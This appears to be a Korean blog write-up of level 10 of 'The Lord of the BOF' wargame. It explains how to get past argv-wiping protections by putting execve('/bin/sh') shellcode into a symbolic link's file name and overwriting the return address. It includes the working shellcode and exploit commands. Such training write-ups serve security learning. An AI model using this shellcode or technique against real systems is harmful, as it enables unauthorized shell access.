---
layout: post
title: "The Lord of the BOF - Level 10"
comments: true
categories: [LOB]
tags: [LOB]
---
<img data-action="zoom" src='{{ "assets/lob/level10/1.jpg" | relative_url }}' alt='relative'>  

## 1) vampire/music world 입력하여 로그인하기  

<img data-action="zoom" src='{{ "assets/lob/level10/2.png" | relative_url }}' alt='relative'>  

인자를 많이 입력해도 argv hunter에 의해 argv 내용이 0으로 덮어 쓰여집니다.  
egg hunter, argv hunter, buffer hunter로 앞서 푼 문제처럼 쉘코드를 입력해도 다 소용 없습니다.  

그런데, (스택 구조의 맨 마지막을 확인해보지 않았으면 몰랐겠지만) 스택의 제일 하단에는 파일명이 저장되어 있습니다.  

## 2) 스택 하단에 파일명  

<img data-action="zoom" src='{{ "assets/lob/level10/3.png" | relative_url }}' alt='relative'>  

<img data-action="zoom" src='{{ "assets/lob/level10/4.png" | relative_url }}' alt='relative'>  

프로그램 실행시 argv[0]에 인자로 입력되는 프로그램 명이 스택에 제일 하단에도 저장되어 있습니다.  

1. 심볼릭 링크를 이용해 프로그램 파일명에 쉘코드를 입력하고,  
2. 쉘코드가 저장되어 있는 스택의 제일 하단 주소를 RET에 입력하면 됩니다.  

## 3) 쉘코드를 포함한 심볼릭 링크 파일 만들기  

level8에서 사용한 명령어를 그대로 사용하겠습니다.  

``` bash
ln -s skeleton `python -c 'print "\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*10'`
```

<img data-action="zoom" src='{{ "assets/lob/level10/5.png" | relative_url }}' alt='relative'>  

## 4) 쉘코드가 저장되어 있는 스택의 제일 하단 주소 임의로 지정하기  

<img data-action="zoom" src='{{ "assets/lob/level10/6.png" | relative_url }}' alt='relative'>  

쉘코드가 저장되어 있을 위치를 임의로 지정하여 RET에 0xbfffffc8를 입력하겠습니다.  

## 5) 공격 페이로드 입력하여 BOF 일으키기  

``` bash
./`python -c 'print "\x90"*50+"\x31\xc0\x50\xb8\x97\x97\x39\x34\x05\x98\x97\x39\x34\x50\xb8\x17\xb1\x34\x37\x05\x18\xb1\x34\x37\x50\x31\xc0\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"+"\x90"*10'` `python -c 'print "A"*44+"\xc8\xff\xff\xbf"'`
```

<img data-action="zoom" src='{{ "assets/lob/level10/7.png" | relative_url }}' alt='relative'>  

위의 페이로드를 제대로 입력했는데도 stack is still your friend. 라는 문자열이 반환된다면 bash2 명령어를 입력하시고 다시 시도해보세요.

